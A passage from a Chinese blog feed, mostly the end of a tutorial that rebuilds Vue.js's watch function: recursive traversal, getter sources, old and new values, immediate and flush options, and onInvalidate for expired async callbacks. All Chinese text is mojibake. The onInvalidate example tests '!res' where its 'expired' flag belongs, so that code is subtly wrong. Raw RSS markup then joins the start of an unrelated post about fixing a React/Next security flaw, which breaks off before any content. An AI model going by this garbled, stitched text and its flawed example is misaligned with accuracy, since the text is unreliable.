<h3 data-id="heading-23">é€šç”¨çš„è¯»å–æ“ä½œçš„å‡½æ•°</h3>
<ul>
<li>è¯»å–æ“ä½œï¼Œæˆ‘åªéœ€è¦è¯» å¹¶ä¸éœ€è¦å…¶ä»–çš„æ“ä½œ</li>
<li>éœ€è¦è¯»å–æ‰€æœ‰çš„å±æ€§ æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€’å½’çš„éå†è§‚å¯Ÿå¯¹è±¡ä¸Šçš„æ‰€æœ‰å±æ€§</li>
<li>éœ€è¦é˜²æ­¢å¾ªç¯å¼•ç”¨çš„é—®é¢˜å‡ºç°ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªsetæ¥è¿›è¡Œå‡æ”¯(æ ‘æ)çš„å¤„ç†</li>
</ul>

<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">watch</span>(source,callback){
       <span class="hljs-built_in">effect</span>(()=&gt;<span class="hljs-built_in">traverse</span>(source),{
      <span class="hljs-built_in">scheduler</span>(){
         <span class="hljs-comment">//å½“æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæ‰§è¡Œå›è°ƒ</span>
              <span class="hljs-built_in">callback</span>()
           }
       })
   }
function <span class="hljs-built_in">traverse</span>(value,seen = new Set()){
      <span class="hljs-comment">//åˆ¤æ–­é€’å½’çš„è¾¹ç•Œ å¦‚æœæ•°æ®æ˜¯åŸå§‹å€¼æˆ–è€…å·²ç»è¯»å–è¿‡äº†</span>
      <span class="hljs-built_in">if</span>(typeof value !== 'object' || value === null || seen.has(value)){
          return
       }
      <span class="hljs-comment">//å°†æ•°æ®æ·»åŠ åˆ°seen å·²è¿›è¡Œæ•°æ®çš„è¯»å–æ“ä½œ</span>
       seen<span class="hljs-selector-class">.add</span>(value)
       <span class="hljs-comment">//æš‚ä¸è€ƒè™‘å…¶ä»–çš„æ•°æ®ç±»å‹</span>
       <span class="hljs-built_in">for</span>(const key in value){
          <span class="hljs-built_in">traverse</span>(value[key],seen)
       }
       return value
   }

<span class="hljs-built_in">watch</span>(obj,()=&gt;{
       console<span class="hljs-selector-class">.log</span>("æ•°æ®å˜åŒ–äº†",obj.foo)
   })
<span class="hljs-comment">//ä¿®æ”¹obj.fooçš„å€¼</span>
obj<span class="hljs-selector-class">.foo</span>++
</code></pre>
<p>æˆ‘ä»¬åœ¨<code>scheduler</code>ä¸­æ·»åŠ ä¸Šæ‰§è¡Œçš„å›è°ƒã€‚ä½¿ç”¨**<code>traverse</code>** è¯»å–å‡½æ•°è¿›è¡Œé€šç”¨çš„è¯»å–æ“ä½œæ¥è§¦å‘å¯¹å“åº”å¼æ•°æ®çš„è¯»å–ã€‚</p>
<h3 data-id="heading-24">å…¶ä»–å¯å“åº”æ•°æ®çš„è§‚æµ‹</h3>
<p>è¿™é‡Œæˆ‘ä»¬è¿˜å¯ä»¥æ·»åŠ å¯¹å…¶ä»–å“åº”å¼æ•°æ®çš„è§‚æµ‹ è¿™é‡Œç•™ä¸ªå£å­</p>
<h3 data-id="heading-25">watch æ”¯æŒgetterå‡½æ•°</h3>
<p>watch å‡½æ•°æ—¢å¯ä»¥æ¥æ”¶ä¸€ä¸ªå“åº”å¼å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥æ¥æ”¶ä¸€ä¸ªgetterå‡½æ•°ã€‚</p>
<p>åœ¨getterå‡½æ•°å†…éƒ¨ï¼Œç”¨æˆ·å¯ä»¥æŒ‡å®šè¯¥watchä¾èµ–å“ªäº›å“åº”å¼æ•°æ®ï¼Œåªæœ‰å½“è¿™äº›å“åº”å¼æ•°æ®å˜åŒ–æ—¶ï¼Œæ‰ä¼šè§¦å‘å›è°ƒå‡½æ•°æ‰§è¡Œã€‚</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">watch</span>(source,callback){
   <span class="hljs-comment">//å®šä¹‰getter</span>
       let getter;
       <span class="hljs-built_in">if</span>(typeof source === 'function'){
      getter = source
       }else{
      <span class="hljs-comment">//å¦åˆ™æŒ‰ç…§åŸæ¥çš„å®ç°è°ƒç”¨traverseé€’å½’åœ°è¯»å–</span>
           getter = ()=&gt;<span class="hljs-built_in">traverse</span>(source)
       }
       <span class="hljs-built_in">effect</span>(()=&gt; <span class="hljs-built_in">getter</span>(),{
      <span class="hljs-built_in">scheduler</span>(){
         <span class="hljs-comment">//å½“æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæ‰§è¡Œå›è°ƒ</span>
         <span class="hljs-built_in">callback</span>()
           }
       })
   }
</code></pre>
<p>ç°åœ¨æˆ‘ä»¬æ—¢å¯ä»¥ä½¿ç”¨å“åº”å¼å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨getterå‡½æ•°ã€‚ç°åœ¨æˆ‘ä»¬è¿˜ç¼ºæœ€é‡è¦çš„ä¸€ä¸ªèƒ½åŠ›ï¼Œæ–°æ—§å€¼çš„æ¯”è¾ƒä¼ é€’ã€‚</p>
<h3 data-id="heading-26">æ”¯æŒæ–°æ—§å€¼çš„ä¼ é€’</h3>
<p>è¿™é‡Œè¦å¦‚ä½•è·å–æ–°å€¼ä¸æ—§å€¼å‘¢ï¼Ÿ</p>
<p>è¿™éœ€è¦å……åˆ†åˆ©ç”¨eff ect å‡½æ•°çš„lazyé€‰é¡¹ï¼Œå¦‚ä»¥ä¸‹ä»£ç æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">watch</span>(source,callback){
   <span class="hljs-comment">//å®šä¹‰getter</span>
       let getter;
       <span class="hljs-built_in">if</span>(typeof source === 'function'){
      getter = source
       }else{
      <span class="hljs-comment">//å¦åˆ™æŒ‰ç…§åŸæ¥çš„å®ç°è°ƒç”¨traverseé€’å½’åœ°è¯»å–</span>
           getter = ()=&gt;<span class="hljs-built_in">traverse</span>(source)
       }

   <span class="hljs-comment">//å®šä¹‰æ—§å€¼ä¸æ–°å€¼</span>
      let oldValue,newValue
       <span class="hljs-comment">//ä½¿ç”¨effectæ³¨å†Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¼€å¯lazyé€‰é¡¹ï¼Œå¹¶æŠŠè¿”å›å€¼å­˜å‚¨åˆ°effectFnä¸­ä¸€éåç»­æ‰‹åŠ¨è°ƒç”¨</span>
      const effectFn =  <span class="hljs-built_in">effect</span>(()=&gt; <span class="hljs-built_in">getter</span>(),{
      lazy:true,
      <span class="hljs-built_in">scheduler</span>(){
         <span class="hljs-comment">//åœ¨ scheduler ä¸­é‡æ–°æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¾—åˆ°çš„æ˜¯æ–°å€¼</span>
         newValue = <span class="hljs-built_in">effectFn</span>()
         <span class="hljs-comment">//å°†æ—§å€¼ä¸æ–°å€¼ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</span>
         <span class="hljs-built_in">callback</span>(newValue,oldValue)
               <span class="hljs-comment">//æ›´æ–°æ—§å€¼ï¼Œ</span>
               oldValue = newValue
           }
       })
       <span class="hljs-comment">//æ‰‹åŠ¨è°ƒç”¨ å…ˆé‚£ä¸€ä¸‹åˆå§‹åŒ–çš„å€¼</span>
       oldValue = <span class="hljs-built_in">effectFn</span>()
   }
</code></pre>
<p>åœ¨è¿™æ®µä»£ç ä¸­ï¼Œæœ€æ ¸å¿ƒçš„æ”¹åŠ¨æ˜¯ä½¿ç”¨äº†lazyé€‰é¡¹åˆ›å»ºäº†ä¸€ä¸ªæ‡’æ‰§è¡Œçš„effectï¼Œ<strong>æ³¨æ„ä¸Šé¢ä»£ç ä¸­æœ€ä¸‹é¢çš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬æ‰‹åŠ¨è°ƒç”¨äº†effectFnå‡½æ•°å¾—åˆ°çš„è¿”å›å€¼å°±æ˜¯æ—§å€¼</strong>ï¼Œè¿™æ˜¯ä¸€æ¬¡åˆå§‹åŒ–çš„è°ƒç”¨ï¼Œæ˜¯åœ¨è§‚æµ‹å“åº”å¼æ•°æ®æ—¶ç›´æ¥æ‹¿åˆ°çš„åˆå§‹å€¼ã€‚å½“å˜åŒ–å‘ç”Ÿå¹¶è§¦å‘äº†schedulerè°ƒåº¦å‡½æ•°å¹¶æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šé‡æ–°è°ƒç”¨effectFnå‡½æ•°å¹¶å¾—åˆ°æ–°çš„å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±åŒæ—¶æ‹¿åˆ°äº†æ–°å€¼å’Œæ—§å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨å›è°ƒå‡½æ•°ä¸­åŒæ—¶è¿”å›äº†ã€‚</p>
<p>æœ€åä¸€ä»¶éå¸¸é‡è¦çš„æ˜¯ä¸è¦å¿˜è®°æ›´æ–°æ—§çš„å€¼ã€‚è¿™æ · æ–°å€¼å˜æ—§å€¼ï¼Œå°±å¯ä»¥ä¸€ç›´è·‘èµ·æ¥äº†ã€‚</p>
<h2 data-id="heading-27">10-ç«‹å³æ‰§è¡Œçš„watchå›è°ƒä¸æ‰§è¡Œæ—¶æœº</h2>
<p>watch çš„ä¸¤ä¸ªç‰¹æ€§ï¼š</p>
<h3 data-id="heading-28">ç«‹å³æ‰§è¡Œçš„å›è°ƒå‡½æ•°</h3>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œwatchçš„å›è°ƒå‡½æ•°åªä¼šåœ¨å“åº”å¼æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œï¼Œé‚£ä¹ˆå¦‚ä½•è®©å…¶ç«‹å³æ‰§è¡Œå‘¢ï¼Ÿ</p>
<p>Vue.jsä¸­å¯ä»¥é€šè¿‡é€‰é¡¹å‚æ•°çš„immediateæ¥æŒ‡å®šå›è°ƒæ˜¯å¦éœ€è¦ç«‹å³æ‰§è¡Œã€‚</p>
<p>å½“immediateä¸ºtrueçš„æ—¶å€™ æˆ‘ä»¬æŠ½å–çš„scheduler å…¬å…±å‡½æ•°å°±æ‰§è¡Œä¸€æ¬¡ï¼Œå®ƒé‡Œé¢åŒ…å«äº†watchçš„å›è°ƒå‡½æ•°callback,</p>
<p>å¦‚æœä¸ºfalseçš„æ—¶å€™ï¼Œå°±è¿˜æ˜¯é»˜è®¤æ‰§è¡Œæˆ‘ä»¬çš„effectFn å®ƒåªæ˜¯å•çº¯çš„è¿”å›çš„å‰¯ä½œç”¨å›è°ƒå‡½æ•°ï¼Œæˆ‘ä»¬é€šè¿‡å®ƒæ‹¿åˆ°ä¸€æ¬¡é»˜è®¤çš„å€¼ã€‚</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">watch</span>(source, callback, options = {}) {
   <span class="hljs-comment">//å®šä¹‰getter</span>
   let getter;
   if (typeof source === 'function') {
      getter = source
   } else {
      <span class="hljs-comment">//å¦åˆ™æŒ‰ç…§åŸæ¥çš„å®ç°è°ƒç”¨traverseé€’å½’åœ°è¯»å–</span>
      getter = () =&gt; <span class="hljs-built_in">traverse</span>(source)
   }
   <span class="hljs-comment">//å®šä¹‰æ—§å€¼ä¸æ–°å€¼</span>
   let oldValue, newValue
   <span class="hljs-comment">//æå–schedulerè°ƒåº¦å‡½æ•°ä¸ºä¸€ä¸ªç‹¬ç«‹çš„jobå‡½æ•°</span>
   const job = () =&gt; {
      <span class="hljs-comment">//åœ¨ scheduler ä¸­é‡æ–°æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¾—åˆ°çš„æ˜¯æ–°å€¼</span>
      newValue = <span class="hljs-built_in">effectFn</span>()
      <span class="hljs-comment">//å°†æ—§å€¼ä¸æ–°å€¼ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</span>
      <span class="hljs-built_in">callback</span>(newValue, oldValue)
      <span class="hljs-comment">//æ›´æ–°æ—§å€¼ï¼Œ</span>
      oldValue = newValue
   }
   <span class="hljs-comment">//ä½¿ç”¨effectæ³¨å†Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¼€å¯lazyé€‰é¡¹ï¼Œå¹¶æŠŠè¿”å›å€¼å­˜å‚¨åˆ°effectFnä¸­ä¸€éåç»­æ‰‹åŠ¨è°ƒç”¨</span>
   const effectFn = <span class="hljs-built_in">effect</span>(() =&gt; <span class="hljs-built_in">getter</span>(), {
      lazy: true,
      scheduler: job
   })
   <span class="hljs-comment">//å½“ immediate ä¸º trueçš„æ—¶å€™ ç«‹å³æ‰§è¡Œä¸€æ¬¡</span>
   <span class="hljs-comment">//å¦‚æœä¸æ˜¯ åˆ™æˆ‘ä»¬å°±æ‹¿ä¸€ä¸‹åˆå§‹å€¼å°±å¯ä»¥ã€‚</span>
   if (options.immediate) {
      <span class="hljs-built_in">job</span>()
   } else {
      <span class="hljs-comment">//æ‰‹åŠ¨è°ƒç”¨ å…ˆé‚£ä¸€ä¸‹åˆå§‹åŒ–çš„å€¼</span>
      <span class="hljs-comment">//è¿™é‡Œçš„å…³é”®æ˜¯ è¿™é‡Œçš„å‰¯ä½œç”¨å‡½æ•°è°ƒç”¨ å¹¶ä¸ä¼šæ‰§è¡Œ watchçš„å›è°ƒå‡½æ•° æ‰€ä»¥å®ƒæ²¡æœ‰ç«‹å³æ‰§è¡Œã€‚</span>
      oldValue = <span class="hljs-built_in">effectFn</span>()
   }
}
</code></pre>
<h3 data-id="heading-29">å›è°ƒå‡½æ•°çš„æ‰§è¡Œæ—¶æœº</h3>
<p>è¿™é‡Œä½¿ç”¨**<code>flush:'pre'</code>** <strong><code>//'post' |'sync'</code></strong> æ¥æ§åˆ¶æ‰§è¡Œçš„æ—¶æœºï¼Œå¦‚æœè®¾ç½®ä¸º Post ,å°±æŠŠä»»åŠ¡æ”¾åœ¨å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­ï¼Œä»è€Œå®ç°å¼‚æ­¥å»¶è¿Ÿæ‰§è¡Œï¼Œå¦åˆ™å°±ç«‹å³æ‰§è¡Œã€‚</p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªç–‘é—®æ˜¯ï¼š<strong>å½“flushä¸ºpostæ—¶ï¼Œä»£è¡¨è°ƒåº¦å‡½æ•°éœ€è¦å°†å‰¯ä½œç”¨å‡½æ•°æ”¾åˆ°ä¸€ä¸ªå¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­ï¼Œå¹¶ç­‰å¾… DOM æ›´æ–°ç»“æŸåæ‰§è¡Œ ï¼Ÿ</strong></p>
<blockquote>
<p>å¾®ä»»åŠ¡é˜Ÿåˆ—çš„æ‰§è¡Œä¸æ˜¯åœ¨ DOM æ›´æ–°ä¹‹å‰å— ä¸ºä»€ä¹ˆè¿™é‡Œè¯´çš„æ˜¯ ä¹‹åå‘¢ ï¼Ÿ</p>
</blockquote>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">watch</span>(source, callback, options = {}) {
   <span class="hljs-comment">//å®šä¹‰getter</span>
   let getter;
   if (typeof source === 'function') {
      getter = source
   } else {
      <span class="hljs-comment">//å¦åˆ™æŒ‰ç…§åŸæ¥çš„å®ç°è°ƒç”¨traverseé€’å½’åœ°è¯»å–</span>
      getter = () =&gt; <span class="hljs-built_in">traverse</span>(source)
   }
   <span class="hljs-comment">//å®šä¹‰æ—§å€¼ä¸æ–°å€¼</span>
   let oldValue, newValue
   <span class="hljs-comment">//æå–schedulerè°ƒåº¦å‡½æ•°ä¸ºä¸€ä¸ªç‹¬ç«‹çš„jobå‡½æ•°</span>
   const job = () =&gt; {
      <span class="hljs-comment">//åœ¨ scheduler ä¸­é‡æ–°æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¾—åˆ°çš„æ˜¯æ–°å€¼</span>
      newValue = <span class="hljs-built_in">effectFn</span>()
      <span class="hljs-comment">//å°†æ—§å€¼ä¸æ–°å€¼ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</span>
      <span class="hljs-built_in">callback</span>(newValue, oldValue)
      <span class="hljs-comment">//æ›´æ–°æ—§å€¼ï¼Œ</span>
      oldValue = newValue
   }
   <span class="hljs-comment">//ä½¿ç”¨effectæ³¨å†Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¼€å¯lazyé€‰é¡¹ï¼Œå¹¶æŠŠè¿”å›å€¼å­˜å‚¨åˆ°effectFnä¸­ä¸€éåç»­æ‰‹åŠ¨è°ƒç”¨</span>
   const effectFn = <span class="hljs-built_in">effect</span>(() =&gt; <span class="hljs-built_in">getter</span>(), {
      lazy: true,
      scheduler: ()=&gt;{
         <span class="hljs-comment">//åœ¨è°ƒåº¦å‡½æ•°ä¸­åˆ¤æ–­ flushæ˜¯å¦ä¸º'post'ï¼Œå¦‚æœæ˜¯ï¼Œå°†å…¶æ”¾åˆ°å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­æ‰§è¡Œ</span>
               <span class="hljs-built_in">if</span>(options.flush === 'post'){
            const <span class="hljs-selector-tag">p</span> = Promise<span class="hljs-selector-class">.resolve</span>()
                   <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.then</span>(job)
               }else{
            <span class="hljs-built_in">job</span>()
               }
           }
   })
   <span class="hljs-comment">//å½“ immediate ä¸º trueçš„æ—¶å€™ ç«‹å³æ‰§è¡Œä¸€æ¬¡</span>
   <span class="hljs-comment">//å¦‚æœä¸æ˜¯ åˆ™æˆ‘ä»¬å°±æ‹¿ä¸€ä¸‹åˆå§‹å€¼å°±å¯ä»¥ã€‚</span>
   if (options.immediate) {
      <span class="hljs-built_in">job</span>()
   } else {
      <span class="hljs-comment">//æ‰‹åŠ¨è°ƒç”¨ å…ˆé‚£ä¸€ä¸‹åˆå§‹åŒ–çš„å€¼</span>
      <span class="hljs-comment">//è¿™é‡Œçš„å…³é”®æ˜¯ è¿™é‡Œçš„å‰¯ä½œç”¨å‡½æ•°è°ƒç”¨ å¹¶ä¸ä¼šæ‰§è¡Œ watchçš„å›è°ƒå‡½æ•° æ‰€ä»¥å®ƒæ²¡æœ‰ç«‹å³æ‰§è¡Œã€‚</span>
      oldValue = <span class="hljs-built_in">effectFn</span>()
   }
}
</code></pre>
<h2 data-id="heading-30">11-è¿‡æœŸçš„å‰¯ä½œç”¨</h2>
<h3 data-id="heading-31">é—®é¢˜æ‰€åœ¨ï¼šå‰¯ä½œç”¨çš„è¿‡æœŸ</h3>
<p>è¿™ä¸€èŠ‚è®²äº†ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ï¼Œå°±æ˜¯<strong>è¿‡æœŸçš„å‰¯ä½œç”¨ï¼Ÿ</strong></p>
<p>å‰¯ä½œç”¨æ€ä¹ˆä¼šè¿‡æœŸå‘¢ï¼Ÿ</p>
<pre><code class="hljs language-ini" lang="ini">let finalData<span class="hljs-comment">;</span>
watch(obj,async ()=&gt;{
    const <span class="hljs-attr">res</span> = await fetch(<span class="hljs-string">'///'</span>)
    <span class="hljs-attr">finalData</span> = res
})
</code></pre>
<p>å½“æˆ‘ä»¬çš„ Objä¿®æ”¹çš„æ—¶å€™ï¼Œè§¦å‘äº†å›è°ƒï¼Œæ‰§è¡Œäº† fetch ï¼Œè¿›è¡Œå¼‚æ­¥è°ƒç”¨ã€‚</p>
<p>åœ¨æ‰§è¡Œå¼‚æ­¥æ‰§è¡Œçš„æ—¶å€™ï¼Œæˆ‘ä»¬åˆä¸€æ¬¡è§¦å‘äº†å›è°ƒå‡½æ•°ï¼Œåˆä¸€æ¬¡å‘èµ·äº†å¼‚æ­¥è¯·æ±‚ã€‚</p>
<p>æˆ‘ä»¬çš„çš„ B å…ˆè¿”å›äº†ï¼ŒAåè¿”å›ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™ æˆ‘ä»¬åº”è¯¥ä½¿ç”¨B çš„ç»“æœï¼Œè€ŒæŠ›å¼ƒ A çš„ç»“æœï¼Œå› ä¸º A æ˜¯ç¬¬ä¸€æ¬¡çš„æ—¶å€™å‘èµ·çš„ï¼Œåæ¥æˆ‘ä»¬æ›´æ–°äº†</p>
<p>A çš„å‰¯ä½œç”¨å·²ç»è¿‡æœŸäº†ã€‚</p>
<p>è¿™ä¸ªå°±æ˜¯é—®é¢˜æ‰€åœ¨ã€‚</p>
<h3 data-id="heading-32">å¦‚ä½•è§£å†³å‘¢ï¼Ÿ</h3>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å‚è€ƒVueæä¾›çš„æ–¹å¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> finalData;
<span class="hljs-title function_">watch</span>(<span class="hljs-function">() =&gt;</span> obj.<span class="hljs-property">foo</span>, <span class="hljs-keyword">async</span> (newValue, oldValue, onInvalidate) =&gt; {
      <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªæ ‡è¯†ï¼Œä»£è¡¨å½“å‰å‰¯ä½œç”¨å‡½æ•°æ˜¯å¦è¿‡æœŸï¼Œé»˜è®¤ä¸ºfalse ä»£è¡¨æ²¡æœ‰è¿‡æœŸ</span>
      <span class="hljs-keyword">let</span> expired = <span class="hljs-literal">false</span>
      <span class="hljs-title function_">onInvalidate</span>(<span class="hljs-function">() =&gt;</span> {
         <span class="hljs-comment">//å½“è¿‡æœŸæ—¶ï¼Œå°†expired è®¾ç½®ä¸ºtrue</span>
         expired = <span class="hljs-literal">true</span>
      })
      <span class="hljs-comment">//å‘é€ç½‘ç»œè¯·æ±‚</span>
      <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/path/to/request'</span>)
      <span class="hljs-keyword">if</span> (!res) {
         finalData = res
      }
   }
)
</code></pre>
<p>å®ƒçš„åŸç†æ˜¯ä»€ä¹ˆï¼š<strong>åœ¨watchå†…éƒ¨æ¯æ¬¡æ£€æŸ¥åˆ°å˜æ›´åï¼Œåœ¨å‰¯ä½œç”¨å‡½æ•°é‡æ–°æ‰§è¡Œä¹‹å‰ï¼Œä¼šå…ˆè°ƒç”¨æˆ‘ä»¬é€šè¿‡onInvalidateå‡½æ•°æ³¨å†Œçš„è¿‡æœŸå›è°ƒã€‚</strong></p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">watch</span>(source, callback, options = {}) {
   <span class="hljs-comment">//å®šä¹‰getter</span>
   let getter;
   if (typeof source === 'function') {
      getter = source
   } else {
      <span class="hljs-comment">//å¦åˆ™æŒ‰ç…§åŸæ¥çš„å®ç°è°ƒç”¨traverseé€’å½’åœ°è¯»å–</span>
      getter = () =&gt; <span class="hljs-built_in">traverse</span>(source)
   }
   <span class="hljs-comment">//å®šä¹‰æ—§å€¼ä¸æ–°å€¼</span>
   let oldValue, newValue
       <span class="hljs-comment">//cleanup ç”¨æ¥å­˜å‚¨ç”¨æˆ·æ³¨å†Œçš„è¿‡æœŸå›è°ƒ</span>
       let cleanup;
       function <span class="hljs-built_in">onInvalidate</span>(fn){
      cleanup = fn
       }
       
   <span class="hljs-comment">//æå–schedulerè°ƒåº¦å‡½æ•°ä¸ºä¸€ä¸ªç‹¬ç«‹çš„jobå‡½æ•°</span>
   const job = () =&gt; {
      <span class="hljs-comment">//åœ¨è°ƒç”¨å›è°ƒcbä¹‹å‰ï¼Œå…ˆè°ƒç”¨è¿‡æœŸå›è°ƒ</span>
           <span class="hljs-built_in">if</span>(cleanup){
         <span class="hljs-built_in">cleanup</span>()
           }
      <span class="hljs-comment">//åœ¨ scheduler ä¸­é‡æ–°æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¾—åˆ°çš„æ˜¯æ–°å€¼</span>
      newValue = <span class="hljs-built_in">effectFn</span>()
      <span class="hljs-comment">//å°†æ—§å€¼ä¸æ–°å€¼ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</span>
      <span class="hljs-built_in">callback</span>(newValue, oldValue,onInvalidate)
      <span class="hljs-comment">//æ›´æ–°æ—§å€¼ï¼Œ</span>
      oldValue = newValue
   }
   <span class="hljs-comment">//ä½¿ç”¨effectæ³¨å†Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¼€å¯lazyé€‰é¡¹ï¼Œå¹¶æŠŠè¿”å›å€¼å­˜å‚¨åˆ°effectFnä¸­ä¸€éåç»­æ‰‹åŠ¨è°ƒç”¨</span>
   const effectFn = <span class="hljs-built_in">effect</span>(() =&gt; <span class="hljs-built_in">getter</span>(), {
      lazy: true,
      scheduler: () =&gt; {
         <span class="hljs-comment">//åœ¨è°ƒåº¦å‡½æ•°ä¸­åˆ¤æ–­ flushæ˜¯å¦ä¸º'post'ï¼Œå¦‚æœæ˜¯ï¼Œå°†å…¶æ”¾åˆ°å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­æ‰§è¡Œ</span>
         if (options.flush === 'post') {
            const <span class="hljs-selector-tag">p</span> = Promise<span class="hljs-selector-class">.resolve</span>()
            <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.then</span>(job)
         } else {
            <span class="hljs-built_in">job</span>()
         }
      }
   })
   <span class="hljs-comment">//å½“ immediate ä¸º trueçš„æ—¶å€™ ç«‹å³æ‰§è¡Œä¸€æ¬¡</span>
   <span class="hljs-comment">//å¦‚æœä¸æ˜¯ åˆ™æˆ‘ä»¬å°±æ‹¿ä¸€ä¸‹åˆå§‹å€¼å°±å¯ä»¥ã€‚</span>
   if (options.immediate) {
      <span class="hljs-built_in">job</span>()
   } else {
      <span class="hljs-comment">//æ‰‹åŠ¨è°ƒç”¨ å…ˆé‚£ä¸€ä¸‹åˆå§‹åŒ–çš„å€¼</span>
      <span class="hljs-comment">//è¿™é‡Œçš„å…³é”®æ˜¯ è¿™é‡Œçš„å‰¯ä½œç”¨å‡½æ•°è°ƒç”¨ å¹¶ä¸ä¼šæ‰§è¡Œ watchçš„å›è°ƒå‡½æ•° æ‰€ä»¥å®ƒæ²¡æœ‰ç«‹å³æ‰§è¡Œã€‚</span>
      oldValue = <span class="hljs-built_in">effectFn</span>()
   }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Reactã€Nextå®‰å…¨æ¼æ´é—®é¢˜ä¿®å¤å’Œè‡ªæµ‹]]></title>    <link>https://juejin.cn/post/7589207843787538467</link>    <guid>https://juejin.cn/post/7589207843787538467</guid>    <pubDate>2025-12-30T02:26:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589207843787538467" data-draft-id="7589181008098689039" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Reactã€Nextå®‰å…¨æ¼æ´é—®é¢˜ä¿®å¤å’Œè‡ªæµ‹"/> <meta itemprop="keywords" content="å‰ç«¯,å®‰å…¨,Next.js"/> <meta itemprop="datePublished" content="2025-12-30T02:26:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ybc4652"/> <meta itemprop="url" content="https://juejin.cn/user/448256476185582"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Reactã€Nextå®‰å…¨æ¼æ´é—®é¢˜ä¿®å¤å’Œè‡ªæµ‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/448256476185582/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ybc4652
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:26:30.000Z" title="Tue Dec 30 2025 02:26:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
